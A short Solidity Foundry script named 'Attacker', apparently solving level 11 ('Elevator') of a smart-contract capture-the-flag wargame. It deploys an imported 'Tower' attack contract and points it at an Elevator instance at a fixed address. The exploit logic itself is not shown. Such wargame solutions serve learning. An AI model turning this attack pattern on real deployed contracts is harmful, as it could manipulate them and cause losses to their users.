// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../instances/Ilevel11.sol";
import "../src/level11.sol";

contract Attacker is Script {
    Elevator level11 = Elevator(0x4Fca95b8f87310d0ddB247184df1e9e5e5D98Dd5);

    function run() external {
        vm.startBroadcast();

        Tower theDarkTower = new Tower();
        theDarkTower.takeElevator(address(level11));

        vm.stopBroadcast();
    }
}
